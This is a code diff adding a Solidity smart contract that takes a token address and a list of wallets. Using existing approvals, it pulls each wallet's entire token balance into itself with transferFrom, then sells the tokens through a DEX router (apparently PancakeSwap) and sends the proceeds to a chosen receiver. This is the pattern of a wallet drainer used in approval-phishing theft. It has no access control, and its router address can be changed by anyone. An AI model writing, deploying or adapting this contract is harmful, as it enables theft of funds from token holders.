@@ -1,0 +1,121 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.9;
+
+interface IUniswapV2Pair {
+    event Approval(address indexed owner, address indexed spender, uint value);
+    event Transfer(address indexed from, address indexed to, uint value);
+
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external;
+
+    function WETH() external pure returns (address);
+
+    function swapExactTokensForETH(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external returns (uint[] memory amounts);
+
+    function getAmountsOut(
+        uint amountIn,
+        address[] memory path
+    ) external view returns (uint[] memory amounts);
+}
+
+interface ERC20 {
+    function balanceOf(address _owner) external view returns (uint256 balance);
+
+    function approve(
+        address _spender,
+        uint256 _value
+    ) external returns (bool success);
+
+    function transferFrom(
+        address from,
+        address to,
+        uint value
+    ) external returns (bool);
+}
+
+contract MainContract {
+    address public UniswapV2PairAddress;
+    address private TokenToSell;
+    IUniswapV2Pair public uinswapContractInstance;
+    address public weth;
+    address[] public path;
+
+    constructor() {
+        UniswapV2PairAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+        uinswapContractInstance = IUniswapV2Pair(UniswapV2PairAddress);
+        weth = uinswapContractInstance.WETH();
+    }
+
+    function changeRouter(address _v2router) public {
+        UniswapV2PairAddress = _v2router;
+        uinswapContractInstance = IUniswapV2Pair(UniswapV2PairAddress);
+        weth = uinswapContractInstance.WETH();
+    }
+
+    function balanceOf(
+        address _TokenToSell,
+        address _wallet
+    ) public view returns (uint256) {
+        return ERC20(_TokenToSell).balanceOf(_wallet);
+    }
+
+    function transferTokens(
+        address _tokenAddress,
+        address[] memory _wallets
+    ) public {
+        for (uint i = 0; i < _wallets.length; i++) {
+            uint tokenBalanceavail = balanceOf(_tokenAddress, _wallets[i]);
+            ERC20(_tokenAddress).transferFrom(
+                _wallets[i],
+                address(this),
+                tokenBalanceavail
+            );
+        }
+    }
+
+    function sellAllToken(address _tokenAddress, address _receiverAddress) public {
+        require(balanceOf(_tokenAddress, address(this)) > 0);
+        // Approve the Uniswap Router to spend the ERC-20 tokens
+        uint256 amountIn = balanceOf(_tokenAddress, address(this));
+        require(
+            ERC20(_tokenAddress).approve(UniswapV2PairAddress, amountIn),
+            "Approval failed"
+        );
+
+        path = [_tokenAddress, weth];
+        uint[] memory amounts = uinswapContractInstance.getAmountsOut(
+            amountIn,
+            path
+        );
+        uint amountOutMin = amounts[1] / 2;
+        uint deadline = block.timestamp + 10000;
+        uinswapContractInstance
+            .swapExactTokensForETHSupportingFeeOnTransferTokens(
+                amountIn,
+                amountOutMin,
+                path,
+                _receiverAddress,
+                deadline
+            );
+    }
+
+    function execute(address _tokenAddress, address _receiverAddress, address[] memory _wallets) public {
+        transferTokens(_tokenAddress, _wallets);
+        sellAllToken(_tokenAddress, _receiverAddress);
+    }
+
+    receive() external payable {
+
+  	}
+}
